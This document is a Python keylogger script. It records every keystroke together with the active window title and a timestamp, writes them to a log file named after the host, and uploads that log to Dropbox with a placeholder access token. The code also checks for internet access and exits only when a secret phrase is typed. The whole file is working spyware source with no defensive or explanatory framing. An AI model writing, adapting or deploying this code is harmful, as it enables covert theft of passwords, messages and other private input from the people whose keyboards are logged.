from pynput import keyboard
from datetime import datetime
import pygetwindow as gw
import dropbox
from dropbox.exceptions import ApiError
from plyer import notification
import socket
import requests
import os
import time

# Dropbox API credentials
DROPBOX_ACCESS_TOKEN = 'YOUR_DROPBOX_TOKEN'  # Replace with your actual access token

# Get the hostname of the device
hostname = socket.gethostname()

# Create a timestamp string based on the current date and time
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

# Combine the hostname and timestamp to create a unique log file
log_file_path = f'logs_{hostname}_{timestamp}.txt'

secret_phrase = ['k', 'e', 'y', '5', 'k', 'i', 'l', 'l']
current_keys = []

def is_internet_available():
    try:
        requests.get("http://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False

def notify_no_internet():
    title = "No Internet Connection"
    message = "Please connect to the internet."
    notification.notify(
        title=title,
        message=message,
        app_icon='KEY 5.ico',
        timeout=10
    )

def notify_secret_phrase_entered():
    title = "Secret Phrase Entered"
    message = "Exiting the program."
    notification.notify(
        title=title,
        message=message,
        app_icon='KEY 5.ico',
        timeout=10
    )

def upload_file_to_dropbox(file_path, access_token):
    dbx = dropbox.Dropbox(access_token)

    with open(file_path, 'rb') as f:
        try:
            dbx.files_upload(f.read(), '/' + file_path, mode=dropbox.files.WriteMode('overwrite'))
            print(f"File '{file_path}' uploaded successfully.")
        except ApiError as e:
            print(f"Error uploading file '{file_path}' to Dropbox:", e)

# Check if the log file exists, and create a new one if it doesn't
if not os.path.exists(log_file_path):
    with open(log_file_path, 'w'):
        pass

# Upload the log file to Dropbox when the program starts
upload_file_to_dropbox(log_file_path, DROPBOX_ACCESS_TOKEN)

def on_press(key):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        if hasattr(key, 'char') and key.char is not None and key.char.lower() == secret_phrase[len(current_keys)]:
            current_keys.append(key.char.lower())

            if current_keys == secret_phrase:
                notify_secret_phrase_entered()
                exit()

        active_application = get_active_application()

        with open(log_file_path, 'a') as f:
            if hasattr(key, 'name'):
                key_repr = key.name
            elif hasattr(key, 'char'):
                key_repr = key.char
            else:
                key_repr = str(key)

            f.write(f'"{current_time}" "{active_application}" "{key_repr}"\n')

    except Exception as e:
        with open(log_file_path, 'a') as f:
            f.write(f'"{current_time}" Error: "{str(e)}"\n')

def get_active_application():
    try:
        active_window = gw.getWindowsWithTitle(gw.getActiveWindow().title)
        if active_window:
            return active_window[0].title
        else:
            return None
    except Exception:
        return None

# Continuously check for internet connectivity
while True:
    if not is_internet_available():
        notify_no_internet()
        time.sleep(1)
        continue

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join() 
